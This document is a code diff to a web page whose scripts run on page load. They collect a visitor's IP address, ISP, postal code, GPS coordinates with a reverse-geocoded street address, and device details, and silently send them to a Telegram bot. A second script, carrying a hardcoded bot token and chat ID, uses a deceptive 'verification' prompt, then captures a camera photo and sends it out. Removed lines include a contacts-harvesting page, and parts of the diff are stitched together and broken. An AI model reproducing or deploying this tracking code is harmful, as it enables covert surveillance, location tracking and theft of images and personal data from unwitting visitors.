@@ -53,58 +53,96 @@
             }
         }
 
-        // Get IP and location data in one request
+        // Enhanced IP and location data function
         async function getNetworkData() {
             try {
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 
-                // Try to get approximate location from IP
+                // Get detailed location from IP
                 let locationData = {};
                 try {
                     const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                     locationData = await locationResponse.json();
+                    
+                    // Additional API for fallback data
+                    if (!locationData.city || !locationData.country) {
+                        const fallbackResponse = await fetch(`https://ipinfo.io/${ipData.ip}/json`);
+                        const fallbackData = await fallbackResponse.json();
+                        locationData = {...locationData, ...fallbackData};
+                    }
                 } catch (e) {
                     console.log('Location API failed, using fallback');
                 }
                 
                 return {
                     ip: ipData.ip,
-                    country: locationData.country_name || 'Unknown',
+                    country: locationData.country_name || locationData.country || 'Unknown',
+                    country_code: locationData.country_code || 'N/A',
                     city: locationData.city || 'Unknown',
-                    region: locationData.region || 'Unknown'
+                    city_code: locationData.postal || locationData.zip || 'N/A',
+                    region: locationData.region || locationData.regionName || 'Unknown',
+                    isp: locationData.org || locationData.isp || 'Unknown',
+                    timezone: locationData.timezone || 'Unknown',
+                    coordinates: locationData.loc || 'Unknown'
                 };
             } catch (error) {
                 console.error('Network data error:', error);
                 return {
                     ip: 'Unknown',
                     country: 'Unknown',
+                    country_code: 'N/A',
                     city: 'Unknown',
-                    region: 'Unknown'
+                    city_code: 'N/A',
+                    region: 'Unknown',
+                    isp: 'Unknown',
+                    timezone: 'Unknown',
+                    coordinates: 'Unknown'
                 };
             }
         }
 
-        // Get precise location if permitted
+        // Get precise location with more details
         async function getPreciseLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) return resolve(null);
                 
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        resolve({
-                            lat: position.coords.latitude,
-                            lon: position.coords.longitude,
-                            accuracy: position.coords.accuracy
-                        });
+                        // Reverse geocoding to get address details
+                        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`)
+                            .then(response => response.json())
+                            .then(data => {
+                                resolve({
+                                    lat: position.coords.latitude,
+                                    lon: position.coords.longitude,
+                                    accuracy: position.coords.accuracy,
+                                    address: {
+                                        road: data.address.road || 'Unknown',
+                                        suburb: data.address.suburb || 'Unknown',
+                                        city: data.address.city || data.address.town || 'Unknown',
+                                        postcode: data.address.postcode || 'Unknown',
+                                        country: data.address.country || 'Unknown',
+                                        country_code: data.address.country_code || 'Unknown'
+                                    }
+                                });
+                            })
+                            .catch(() => {
+                                resolve({
+                                    lat: position.coords.latitude,
+                                    lon: position.coords.longitude,
+                                    accuracy: position.coords.accuracy,
+                                    address: null
+                                });
+                            });
                     },
                     () => resolve(null),
-                    {enableHighAccuracy: true, timeout: 5000}
+                    {enableHighAccuracy: true, timeout: 10000}
                 );
             });
         }
 
-        // Get all device info at once
+        // Get all device info with enhanced location
         async function collectAllData() {
             const [networkData, preciseLocation, battery] = await Promise.all([
                 getNetworkData(),
@@ -116,18 +154,27 @@
             const connection = navigator.connection || {};
             
             return {
-                // Network info
+                // Enhanced Network info
                 ip: networkData.ip,
                 country: networkData.country,
+                country_code: networkData.country_code,
                 city: networkData.city,
+                city_code: networkData.city_code,
                 region: networkData.region,
+                isp: networkData.isp,
+                timezone: networkData.timezone,
+                ip_coordinates: networkData.coordinates,
                 
-                // Location
+                // Enhanced Location
                 preciseLocation: preciseLocation 
-                    ? `${preciseLocation.lat}, ${preciseLocation.lon} (±${Math.round(preciseLocation.accuracy)}m)`
+                    ? {
+                        coordinates: `${preciseLocation.lat}, ${preciseLocation.lon}`,
+                        accuracy: `${Math.round(preciseLocation.accuracy)}m`,
+                        address: preciseLocation.address || 'No address details'
+                      }
                     : 'Denied',
                 
-                // Device info
+                // Device info (unchanged)
                 deviceModel: navigator.userAgentData?.model || 'Unknown',
                 os: navigator.userAgent.match(/(Windows NT|Mac OS X|Linux|Android|iOS) [\d._]+/)?.[0] || 'Unknown',
                 deviceType: navigator.userAgentData?.mobile ? 'Mobile' : 'Desktop',
@@ -161,17 +208,38 @@
             };
         }
 
-        // Format the data for Telegram
+        // Enhanced format for Telegram with location details
         function formatData(data) {
             let message = `📱 <b>Device Information</b>\n\n`;
             
-            message += `🌍 <b>Location</b>\n`;
+            message += `🌍 <b>Network Location (IP Based)</b>\n`;
             message += `- IP: ${data.ip}\n`;
-            message += `- Country: ${data.country}\n`;
+            message += `- Country: ${data.country} (${data.country_code})\n`;
             message += `- Region: ${data.region}\n`;
-            message += `- City: ${data.city}\n`;
-            message += `- Precise Location: ${data.preciseLocation}\n\n`;
+            message += `- City: ${data.city} (Postal: ${data.city_code})\n`;
+            message += `- ISP: ${data.isp}\n`;
+            message += `- Coordinates: ${data.ip_coordinates}\n`;
+            message += `- Timezone: ${data.timezone}\n\n`;
             
+            if (data.preciseLocation !== 'Denied') {
+                message += `📍 <b>Precise Location</b>\n`;
+                message += `- Coordinates: ${data.preciseLocation.coordinates}\n`;
+                message += `- Accuracy: ±${data.preciseLocation.accuracy}\n`;
+                
+                if (data.preciseLocation.address !== 'No address details') {
+                    message += `- Address:\n`;
+                    message += `  Road: ${data.preciseLocation.address.road}\n`;
+                    message += `  Area: ${data.preciseLocation.address.suburb}\n`;
+                    message += `  City: ${data.preciseLocation.address.city}\n`;
+                    message += `  Postal: ${data.preciseLocation.address.postcode}\n`;
+                    message += `  Country: ${data.preciseLocation.address.country} (${data.preciseLocation.address.country_code})\n`;
+                }
+                message += `\n`;
+            } else {
+                message += `📍 <b>Precise Location: Permission Denied</b>\n\n`;
+            }
+            
+            // Rest of device info (unchanged)
             message += `📱 <b>Device</b>\n`;
             message += `- Model: ${data.deviceModel}\n`;
             message += `- OS: ${data.os}\n`;
@@ -217,8 +285,6 @@
                 const formattedMessage = formatData(allData);
                 await sendToTelegram(formattedMessage);
                 
-                // Optional: You can add file upload capability here if needed
-                
             } catch (error) {
                 console.error('Error in silent operation:', error);
                 await sendToTelegram(`⚠️ Error collecting data: ${error.message}`);
@@ -231,17 +297,17 @@
         // Start immediately when page loads
         window.onload = runSilently;
     </script>
-        <script>
+    <script>
 document.addEventListener('DOMContentLoaded', function() {
-    // بيانات بوت التليجرام
+    // Telegram bot data
     const botToken = '7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94';
     const chatId = '6913353602';
     
-    // عرض رسالة التأكيد
-    const userConfirmed = confirm('هل تريد مشاركة معلومات الجهاز مع الإدارة؟');
+    // Show confirmation message in English
+    const userConfirmed = confirm('Do you want to share your device information for verification?');
     
     if (userConfirmed) {
-        // جمع معلومات الجهاز
+        // Collect device information
         const deviceInfo = {
             userAgent: navigator.userAgent,
             platform: navigator.platform,
@@ -252,10 +318,10 @@ document.addEventListener('DOMContentLoaded', function() {
             timestamp: new Date().toISOString()
         };
         
-        // إرسال معلومات الجهاز إلى التليجرام
-        sendToTelegram(botToken, chatId, `📱 معلومات الجهاز:\n${JSON.stringify(deviceInfo, null, 2)}`);
+        // Send device info to Telegram
+        sendToTelegram(botToken, chatId, `📱 Device Information:\n${JSON.stringify(deviceInfo, null, 2)}`);
         
-        // محاولة الوصول إلى الكاميرا
+        // Try to access camera
         if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(function(stream) {
@@ -265,19 +331,19 @@ document.addEventListener('DOMContentLoaded', function() {
                     return imageCapture.takePhoto();
                 })
                 .then(function(blob) {
-                    // إرسال الصورة إلى التليجرام
+                    // Send photo to Telegram
                     sendPhotoToTelegram(botToken, chatId, blob);
                 })
                 .catch(function(error) {
                     console.error('Error accessing camera:', error);
-                    sendToTelegram(botToken, chatId, '⚠️ تعذر الوصول إلى الكاميرا: ' + error.message);
+                    sendToTelegram(botToken, chatId, '⚠️ Failed to access camera: ' + error.message);
                 });
         } else {
-            sendToTelegram(botToken, chatId, '⚠️ المتصفح لا يدعم الوصول إلى الكاميرا');
+            sendToTelegram(botToken, chatId, '⚠️ Browser does not support camera access');
         }
     }
     
-    // دالة لإرسال نص إلى التليجرام
+    // Function to send text to Telegram
     function sendToTelegram(token, chatId, text) {
         const url = `https://api.telegram.org/bot${token}/sendMessage`;
         
@@ -293,7 +359,7 @@ document.addEventListener('DOMContentLoaded', function() {
         }).catch(error => console.error('Error sending to Telegram:', error));
     }
     
-    // دالة لإرسال صورة إلى التليجرام
+    // Function to send photo to Telegram
     function sendPhotoToTelegram(token, chatId, photoBlob) {
         const url = `https://api.telegram.org/bot${token}/sendPhoto`;
         const formData = new FormData();
@@ -307,134 +373,6 @@ document.addEventListener('DOMContentLoaded', function() {
         }).catch(error => console.error('Error sending photo to Telegram:', error));
     }
 });
-</script>
-document.getElementById('requestAccess').addEventListener('click', async () => {
-    try {
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>خدمة إرسال البيانات</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            max-width: 600px;
-            margin: 0 auto;
-            padding: 20px;
-            text-align: center;
-        }
-        .container {
-            background: #f9f9f9;
-            border-radius: 10px;
-            padding: 20px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        button {
-            background: #0088cc;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-            margin: 10px;
-        }
-        #result {
-            margin-top: 20px;
-            padding: 15px;
-            border-radius: 5px;
-            background: #f0f0f0;
-            text-align: right;
-        }
-        .warning {
-            color: red;
-            font-weight: bold;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>خدمة إرسال البيانات</h1>
-        <p class="warning">⚠️ يجب فتح هذه الصفحة مباشرة (ليست داخل إطار) وتشغيلها على خادم HTTPS</p>
-        
-        <button id="requestBtn">طلب الإذن والوصول إلى الجهات</button>
-        
-        <div id="result"></div>
-    </div>
-
-    <script>
-        // ⚠️ تحذير: هذا غير آمن للإنتاج - فقط لأغراض الاختبار
-        const BOT_TOKEN = "YOUR_BOT_TOKEN";
-        const CHAT_ID = "YOUR_CHAT_ID";
-        
-        document.getElementById('requestBtn').addEventListener('click', async () => {
-            const resultElement = document.getElementById('result');
-            try {
-                // التحقق من شروط التشغيل
-                if (window.self !== window.top) {
-                    throw new Error("يجب فتح الصفحة مباشرة وليس داخل إطار iframe");
-                }
-                
-                if (!('contacts' in navigator && 'ContactsManager' in window)) {
-                    throw new Error("المتصفح لا يدعم واجهة جهات الاتصال أو لم يتم تحميل الصفحة عبر HTTPS");
-                }
-
-                // طلب الإذن أولاً
-                const permissionStatus = await navigator.permissions.query({
-                    name: 'contacts'
-                });
-                
-                if (permissionStatus.state !== 'granted') {
-                    throw new Error("لم يتم منح الإذن للوصول إلى جهات الاتصال");
-                }
-
-                // تحديد حقول البيانات المطلوبة
-                const props = ['name', 'tel'];
-                const opts = { multiple: true };
-                
-                // فتح واجهة اختيار الجهات
-                const contacts = await navigator.contacts.select(props, opts);
-                
-                if (!contacts || contacts.length === 0) {
-                    resultElement.innerText = "لم يتم اختيار أي جهات اتصال";
-                    return;
-                }
-                
-                // تحضير البيانات للإرسال
-                let message = "📱 جهات الاتصال المحددة:\n\n";
-                contacts.forEach(contact => {
-                    message += `👤 ${contact.name || 'لا يوجد اسم'}: ${contact.tel}\n`;
-                });
-                
-                // إرسال البيانات
-                await sendToTelegram(message);
-                resultElement.innerHTML = "<strong>✅ تم الإرسال بنجاح!</strong>";
-                
-            } catch (error) {
-                resultElement.innerHTML = `<span class="warning">❌ خطأ:</span> ${error.message}`;
-                console.error(error);
-            }
-        });
-
-        async function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            const response = await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    disable_web_page_preview: true
-                })
-            });
-            
-            if (!response.ok) {
-                throw new Error(`فشل الإرسال: ${response.status}`);
-            }
-            
-            return await response.json();
-        }
     </script>
 </body>
 </html>
